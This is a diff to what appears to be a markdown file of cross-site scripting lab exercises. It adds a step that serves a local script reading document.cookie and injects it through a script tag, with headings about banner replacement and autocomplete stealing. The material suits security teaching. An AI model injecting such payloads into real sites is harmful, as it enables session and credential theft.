@@ -108,6 +108,13 @@ document.forms[0].onsubmit = function demo(){
 ```
 
 ### 9. Include external
+```
+> python -m http.server 8000
+window.addEventListener("load", function(){alert(document.cookie);});  
+
+<script src="http://localhost:8000/test.js"></script>
+```
+  
 ### 10. Include external js using
 ### 11. Solution replace banner
 ### 12. Solution Stealing from autocomplete
